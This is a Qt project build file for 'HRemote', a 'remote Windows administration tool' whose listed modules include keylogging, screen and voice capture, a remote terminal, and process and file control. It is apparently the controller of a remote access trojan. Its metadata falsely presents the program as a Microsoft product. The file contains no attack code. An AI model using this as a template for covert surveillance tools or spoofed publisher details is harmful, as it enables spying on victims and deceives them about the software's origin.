#-------------------------------------------------
#
# Project created by QtCreator 2017-06-20T21:08:00
#
#-------------------------------------------------

QT       += core gui
QT       += network
QT       += winextras
QT       += sql
CONFIG += C++11
RC_ICONS = image/Icon.ico

VERSION = 1.1.0
RC_LANG = 0x0004
QMAKE_TARGET_COMPANY = Microsoft China
QMAKE_TARGET_PRODUCT = HRemote
QMAKE_TARGET_DESCRIPTION = A remote Windows administration tool
QMAKE_TARGET_COPYRIGHT = Microsoft Corporation. All rights reserved.



greaterThan(QT_MAJOR_VERSION, 4): QT += widgets

TARGET = HRemote1_1
TEMPLATE = app

# The following define makes your compiler emit warnings if you use
# any feature of Qt which as been marked as deprecated (the exact warnings
# depend on your compiler). Please consult the documentation of the
# deprecated API in order to know how to port your code away from it.
DEFINES += QT_DEPRECATED_WARNINGS

# You can also make your code fail to compile if you use deprecated APIs.
# In order to do so, uncomment the following line.
# You can also select to disable deprecated APIs only up to a certain version of Qt.
#DEFINES += QT_DISABLE_DEPRECATED_BEFORE=0x060000    # disables all the APIs deprecated before Qt 6.0.0


SOURCES += \
    main.cpp \
    mainwindow.cpp \
    nofocusdelegate.cpp \
    tool.cpp \
    getiparea.cpp \
    threadsafequeue.cpp \
    netmanager.cpp \
    mystruct.cpp \
    mylistenWindows.cpp \
    myaccepyThread.cpp \
    mykeylogWindows.cpp \
    myscreenWindows.cpp \
    myterminalwindows.cpp \
    myvoicewindows.cpp \
    myprocesswindows.cpp \
    myfilewindows.cpp


HEADERS += \
    mainwindow.h \
    tool.h \
    netmanager.h \
    mylistenWindows.h \
    myaccepyThread.h \
    zlib/zconf.h \
    zlib/zlib.h \
    mykeylogWindows.h \
    myscreenWindows.h \
    myterminalwindows.h \
    myvoicewindows.h \
    myprocesswindows.h \
    myfilewindows.h

FORMS += \
    mainwindow.ui

RESOURCES += \
    image.qrc \

LIBS += -lwsock32
LIBS += -lWs2_32
LIBS += -lwinmm



win32: LIBS += -L$$PWD/zlib/ -lz

INCLUDEPATH += $$PWD/zlib
DEPENDPATH += $$PWD/zlib

win32:!win32-g++: PRE_TARGETDEPS += $$PWD/zlib/z.lib
else:win32-g++: PRE_TARGETDEPS += $$PWD/zlib/libz.a
